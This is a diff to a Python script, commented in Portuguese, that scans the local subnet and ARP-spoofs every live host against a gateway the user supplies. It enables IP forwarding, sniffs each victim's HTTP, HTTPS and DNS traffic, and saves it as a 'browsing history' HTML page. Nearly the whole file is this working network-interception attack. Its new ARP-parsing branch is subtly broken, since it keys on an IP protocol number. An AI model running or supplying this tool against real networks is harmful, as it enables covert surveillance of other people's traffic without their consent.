@@ -3,7 +3,7 @@ import socket
 import struct
 import threading
 from queue import Queue
-from time import sleep, strftime
+from time import sleep, strftime, time
 from datetime import datetime
 
 
@@ -49,7 +49,7 @@ def is_host_alive(ip):
 def discover_hosts(local_ip, active_hosts, history_file, thread_count=50):
     """Realiza a varredura de IPs ativos na sub-rede."""
     subnet = ".".join(local_ip.split(".")[:3])  # Determina a sub-rede (ex.: 192.168.1)
-    print(f"[*] Iniciando varredura na sub-rede: {subnet}.0/25")
+    print(f"[*] Iniciando varredura na sub-rede: {subnet}.0/24")
 
     ip_queue = Queue()
     for i in range(1, 255):
@@ -81,86 +81,92 @@ def discover_hosts(local_ip, active_hosts, history_file, thread_count=50):
     print("[*] IPs ativos encontrados:", active_hosts)
 
 
-def enable_ip_forwarding():
-    """Habilita o encaminhamento de pacotes no Linux."""
-    os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")
+def execute_arp_spoof(interface, target_ip, gateway_ip):
+    """Executa um ataque ARP spoofing usando a ferramenta arpspoof."""
+    print(f"[*] Executando ARP spoofing entre {target_ip} e {gateway_ip}...")
+    os.system(f"arpspoof -i {interface} -t {target_ip} {gateway_ip} &")
+    os.system(f"arpspoof -i {interface} -t {gateway_ip} {target_ip} &")
 
 
-def disable_ip_forwarding():
-    """Desabilita o encaminhamento de pacotes no Linux."""
-    os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")
-
-
-def arp_spoof(interface, target_ip, spoof_ip):
-    """Executa o ARP Spoofing usando o comando arpspoof."""
-    os.system(f"sudo arpspoof -i {interface} -t {target_ip} {spoof_ip}")
-
-
-def verify_arp_table():
-    """Verifica a tabela ARP no sistema."""
-    os.system("arp -n")
-
-
-def sniff_traffic(interface, target_ip, output_file):
+def sniff_traffic(interface, target_ip, traffic_data, duration=30):
     """Captura e registra o tráfego HTTP/HTTPS/DNS do alvo."""
-    print(f"[*] Monitorando tráfego de {target_ip}")
+    print(f"[*] Monitorando tráfego de {target_ip} por {duration} segundos")
     raw_socket = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.ntohs(0x0800))
     packets_received = 0  # Contador de pacotes recebidos
+    start_time = time()
 
-    with open(output_file, "a") as html_file:
-        try:
-            while True:
-                packet, _ = raw_socket.recvfrom(65565)
-                eth_header = packet[:14]
-                eth_data = struct.unpack("!6s6sH", eth_header)
-                if socket.ntohs(eth_data[2]) == 0x0800:  # IPv4
-                    ip_header = packet[14:34]
-                    iph = struct.unpack("!BBHHHBBH4s4s", ip_header)
-                    protocol = iph[6]
-                    src_ip = socket.inet_ntoa(iph[8])
-                    dest_ip = socket.inet_ntoa(iph[9])
-                    if src_ip == target_ip or dest_ip == target_ip:
-                        if protocol == 6:  # TCP
-                            tcp_header = packet[34:54]
-                            tcph = struct.unpack('!HHLLBBHHH', tcp_header)
-                            src_port = tcph[0]
-                            dest_port = tcph[1]
+    try:
+        while time() - start_time < duration:
+            packet, _ = raw_socket.recvfrom(65565)
+            eth_header = packet[:14]
+            eth_data = struct.unpack("!6s6sH", eth_header)
+            if socket.ntohs(eth_data[2]) == 0x0800:  # IPv4
+                ip_header = packet[14:34]
+                iph = struct.unpack("!BBHHHBBH4s4s", ip_header)
+                protocol = iph[6]
+                src_ip = socket.inet_ntoa(iph[8])
+                dest_ip = socket.inet_ntoa(iph[9])
+                if src_ip == target_ip or dest_ip == target_ip:
+                    if protocol == 6:  # TCP
+                        tcp_header = packet[34:54]
+                        tcph = struct.unpack('!HHLLBBHHH', tcp_header)
+                        src_port = tcph[0]
+                        dest_port = tcph[1]
 
-                            if src_port == 80 or dest_port == 80:  # HTTP
-                                packets_received += 1
-                                timestamp = strftime("%Y-%m-%d %H:%M:%S")
-                                html_file.write(f"<li>{timestamp} - {src_ip} -> {dest_ip} [HTTP]</li>\n")
-                                html_file.flush()
-                            elif src_port == 443 or dest_port == 443:  # HTTPS
-                                packets_received += 1
-                                timestamp = strftime("%Y-%m-%d %H:%M:%S")
-                                html_file.write(f"<li>{timestamp} - {src_ip} -> {dest_ip} [HTTPS]</li>\n")
-                                html_file.flush()
+                        if src_port == 80 or dest_port == 80:  # HTTP
+                            packets_received += 1
+                            timestamp = strftime("%Y-%m-%d %H:%M:%S")
+                            traffic_data.append(f"<li>{timestamp} - {src_ip} -> {dest_ip} [HTTP]</li>\n")
+                        elif src_port == 443 or dest_port == 443:  # HTTPS
+                            packets_received += 1
+                            timestamp = strftime("%Y-%m-%d %H:%M:%S")
+                            traffic_data.append(f"<li>{timestamp} - {src_ip} -> {dest_ip} [HTTPS]</li>\n")
 
-                        elif protocol == 17:  # UDP
-                            udp_header = packet[34:42]
-                            udph = struct.unpack('!HHHH', udp_header)
-                            src_port = udph[0]
-                            dest_port = udph[1]
+                    elif protocol == 17:  # UDP
+                        udp_header = packet[34:42]
+                        udph = struct.unpack('!HHHH', udp_header)
+                        src_port = udph[0]
+                        dest_port = udph[1]
 
-                            if src_port == 53 or dest_port == 53:  # DNS
-                                packets_received += 1
-                                timestamp = strftime("%Y-%m-%d %H:%M:%S")
-                                html_file.write(f"<li>{timestamp} - {src_ip} -> {dest_ip} [DNS]</li>\n")
-                                html_file.flush()
+                        if src_port == 53 or dest_port == 53:  # DNS
+                            packets_received += 1
+                            timestamp = strftime("%Y-%m-%d %H:%M:%S")
+                            traffic_data.append(f"<li>{timestamp} - {src_ip} -> {dest_ip} [DNS]</li>\n")
 
-                        if packets_received == 1:  # Primeira ocorrência de tráfego detectado
-                            print(f"[+] Tráfego detectado do alvo {target_ip}.")
-        except KeyboardInterrupt:
-            print(f"[!] Monitoramento de {target_ip} interrompido.")
-        finally:
-            html_file.write(f"</ul></body></html>\n")
-            print(f"[*] Total de pacotes recebidos do alvo {target_ip}: {packets_received}")
+                    # Interpretando resposta ARP
+                    elif protocol == 1:  # ARP
+                        arp_header = packet[14:42]
+                        arph = struct.unpack('!HHBBH6s4s6s4s', arp_header)
+                        src_mac = ':'.join('%02x' % b for b in arph[5])
+                        src_ip_arp = socket.inet_ntoa(arph[6])
+                        dest_mac = ':'.join('%02x' % b for b in arph[7])
+                        dest_ip_arp = socket.inet_ntoa(arph[8])
+                        if src_ip_arp == target_ip or dest_ip_arp == target_ip:
+                            packets_received += 1
+                            timestamp = strftime("%Y-%m-%d %H:%M:%S")
+                            traffic_data.append(f"<li>{timestamp} - ARP: {src_mac} ({src_ip_arp}) -> {dest_mac} ({dest_ip_arp})</li>\n")
+
+                    if packets_received == 1:  # Primeira ocorrência de tráfego detectado
+                        print(f"[+] Tráfego detectado do alvo {target_ip}.")
+    except KeyboardInterrupt:
+        print(f"[!] Monitoramento de {target_ip} interrompido.")
+    finally:
+        print(f"[*] Total de pacotes recebidos do alvo {target_ip}: {packets_received}")
 
 
 def main():
     local_ip = get_local_ip()
-    interface = os.listdir('/sys/class/net/')[0]  # Usa a primeira interface disponível
+    interfaces = os.listdir('/sys/class/net/')
+    interface = None
+    for iface in interfaces:
+        if iface != 'lo':  # Ignora interface de loopback
+            interface = iface
+            break
+
+    if not interface:
+        print("[!] Nenhuma interface de rede válida encontrada.")
+        return
+
     local_mac = get_mac(interface)
 
     if not local_mac:
@@ -171,40 +177,45 @@ def main():
     print(f"[+] IP local: {local_ip}")
     print(f"[+] MAC local: {local_mac}")
 
-    enable_ip_forwarding()
+    # Habilitar encaminhamento de pacotes
+    os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")
 
     active_hosts = []
     history_file = "historico_ips.txt"
     traffic_file = "historico_trafego.html"
-
-    with open(traffic_file, "w") as html_file:
-        html_file.write("<html><head><title>Histórico de Navegação</title></head><body><ul>\n")
+    traffic_data = []
 
     discover_hosts(local_ip, active_hosts, history_file)
 
-    if len(active_hosts) < 2:
-        print("[!] Não há IPs suficientes para realizar o ataque ARP Spoofing.")
-        disable_ip_forwarding()
+    if len(active_hosts) < 1:
+        print("[!] Não há IPs suficientes para monitorar o tráfego.")
         return
+
+    gateway_ip = input("Digite o IP do gateway da rede: ")  # Permite definir dinamicamente o IP do gateway
+    for target_ip in active_hosts:
+        execute_arp_spoof(interface, target_ip, gateway_ip)
 
     try:
         threads = []
         for target_ip in active_hosts:
-            print(f"[*] Executando ARP Spoofing contra {target_ip}...")
-            spoof_thread = threading.Thread(target=arp_spoof, args=(interface, target_ip, local_ip))
-            sniff_thread = threading.Thread(target=sniff_traffic, args=(interface, target_ip, traffic_file))
-            threads.append(spoof_thread)
+            print(f"[*] Monitorando tráfego de {target_ip}...")
+            sniff_thread = threading.Thread(target=sniff_traffic, args=(interface, target_ip, traffic_data, 30))
             threads.append(sniff_thread)
-            spoof_thread.start()
             sniff_thread.start()
         for t in threads:
             t.join()
     except KeyboardInterrupt:
-        print("[!] Ataque ARP Spoofing interrompido.")
+        print("[!] Monitoramento interrompido.")
     finally:
-        disable_ip_forwarding()
         print("[*] Verificando tabelas ARP...")
-        verify_arp_table()
+        os.system("arp -n")
+
+        # Escrever o arquivo HTML após o monitoramento
+        with open(traffic_file, "w") as html_file:
+            html_file.write("<html><head><title>Histórico de Navegação</title></head><body><ul>\n")
+            html_file.writelines(traffic_data)
+            html_file.write("</ul></body></html>\n")
+        print(f"[*] Histórico de tráfego salvo em {traffic_file}")
 
 
 if __name__ == "__main__":
